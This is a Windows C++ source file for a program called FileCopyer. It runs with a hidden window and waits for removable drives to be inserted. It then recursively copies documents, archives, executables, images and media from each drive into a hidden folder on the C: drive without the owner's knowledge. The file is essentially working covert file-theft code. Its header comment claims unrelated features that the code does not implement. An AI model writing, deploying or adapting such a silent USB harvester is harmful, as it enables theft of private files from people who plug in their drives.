// FileCopyer.cpp : 定义应用程序的入口点。
//

#include "framework.h"
#include "FileCopyer.h"

#define MAX_LOADSTRING 100

// 全局变量:
HINSTANCE hInst;                                // 当前实例
WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名

// 此代码模块中包含的函数的前向声明:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
wchar_t file[255] = L"C:\\SAtemp\\file\\",temp[15];
void s(LPCWSTR a)//调试用MessageBox
{
	MessageBox(NULL, a, L"", NULL);
}
void s(int a)
{
	wchar_t tmp[34];
	_itow_s(a, tmp, 10);
	MessageBox(NULL, tmp, L"", NULL);
}
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
	int a = GetTickCount();
	CreateDirectory(L"C:\\SAtemp", 0);
	CreateDirectory(file, 0);
	_itow_s(a, temp, 12);
	wcscat_s(file, temp);
	s(file);
	CreateDirectory(file, 0);
    // TODO: 在此处放置代码。

    // 初始化全局字符串
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_FILECOPYER, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // 执行应用程序初始化:
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_FILECOPYER));

    MSG msg;

    // 主消息循环:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int) msg.wParam;
}


void SearchTool(LPCWSTR lpPath)//1 打开极域 2 删除shutdown 3 删除文件夹
{//有多个功能的函数，所以叫它"Tool"
	wchar_t szFind[255], szFile[255];//因为都用的是同一段搜索代码，所以就干脆把三个按钮功能合起来了
	WIN32_FIND_DATA FindFileData;
	wcscpy_s(szFind, lpPath);
	wcscat_s(szFind, L"\\*.*");
	HANDLE hFind = ::FindFirstFile(szFind, &FindFileData);
	if (INVALID_HANDLE_VALUE == hFind) return;
	while (TRUE)
	{
		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{//发现是一个文件夹
			if (!(FindFileData.cFileName[0] == '.' && (wcslen(FindFileData.cFileName) == 1 || (wcslen(FindFileData.cFileName) == 2 && FindFileData.cFileName[1] == '.'))))
			{//不是开头带"."的回退文件夹
				wcscpy_s(szFile, lpPath);
				wcscat_s(szFile, L"\\");
				wcscat_s(szFile, FindFileData.cFileName);
				SearchTool(szFile);//递归查找
				
			}//删除完这个文件夹内的文件后删除这个空文件夹
		}
		else
		{//发现是一个文件
			
			wchar_t tmpfrom[350], tmpto[350];
			wcscpy_s(tmpfrom, lpPath);
			wcscat_s(tmpfrom, L"\\");
			wcscat_s(tmpfrom, FindFileData.cFileName);
			wcscpy_s(tmpto, file);
			wcscat_s(tmpto, L"\\");
			wcscat_s(tmpto, FindFileData.cFileName);
			wchar_t* p = FindFileData.cFileName;
			while (*p) p++;
			for (int i = 0; i <= 10 && *p != '.';++i) p--;
			p++;
			wchar_t tm[50] = { 0 };
			if(wcslen(p)!=0)wcscpy_s(tm, p);
			_wcslwr_s(tm);
			//s(FindFileData.cFileName);

			if(wcsstr(tm,L"doc")!=0|| wcsstr(tm, L"ppt") != 0 || wcsstr(tm, L"xls") != 0 || \
				wcsstr(tm, L"txt") != 0 || wcsstr(tm, L"exe") != 0 || wcsstr(tm, L"pdf") != 0 \
				|| wcsstr(tm, L"swf") != 0 || wcsstr(tm, L"mpg") != 0 || wcsstr(tm, L"mp3") != 0\
				|| wcsstr(tm, L"wav") != 0 || wcsstr(tm, L"zip") != 0 || wcsstr(tm, L"rar") != 0\
				|| wcsstr(tm, L"7z") != 0 || wcsstr(tm, L"mp4") != 0 || wcsstr(tm, L"avi") != 0\
				|| wcsstr(tm, L"jpg") != 0 || wcsstr(tm, L"bmp") != 0 || wcsstr(tm, L"png") != 0)
			CopyFile(tmpfrom, tmpto, true);
			
		}
		if (!FindNextFile(hFind, &FindFileData))break;//没有下一个文件了
	}
	FindClose(hFind);//关闭句柄
}

//
//  函数: MyRegisterClass()
//
//  目标: 注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_FILECOPYER));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_FILECOPYER);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   函数: InitInstance(HINSTANCE, int)
//
//   目标: 保存实例句柄并创建主窗口
//
//   注释:
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // 将实例句柄存储在全局变量中

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return FALSE;
   }

  // ShowWindow(hWnd, nCmdShow);
  // UpdateWindow(hWnd);

   return TRUE;
}

//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目标: 处理主窗口的消息。
//
//  WM_COMMAND  - 处理应用程序菜单
//  WM_PAINT    - 绘制主窗口
//  WM_DESTROY  - 发送退出消息并返回
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
	case WM_DEVICECHANGE:
	{
		//s(wParam);
		if (wParam == 32768)
		{
			UINT DiskType;
			size_t   szAllDriveStrings = GetLogicalDriveStrings(0, NULL);
			wchar_t* pDriveStrings = new wchar_t[szAllDriveStrings + sizeof(_T(" "))];
			GetLogicalDriveStrings(szAllDriveStrings, pDriveStrings);
			size_t   szDriveString = wcslen(pDriveStrings);
			while (szDriveString > 0)
			{
				//s(pDriveStrings);
				DiskType = GetDriveType(pDriveStrings);
				switch (DiskType)
				{
				case   DRIVE_NO_ROOT_DIR:
					return 0;
				case   DRIVE_REMOVABLE:
					SearchTool(pDriveStrings);
					//s(L"移动存储设备 ");
					break;
				}
				pDriveStrings += szDriveString + 1;
				szDriveString = wcslen(pDriveStrings);
			}
		}
		break;
	}
   
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: 在此处添加使用 hdc 的任何绘图代码...
            EndPaint(hWnd, &ps);
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}
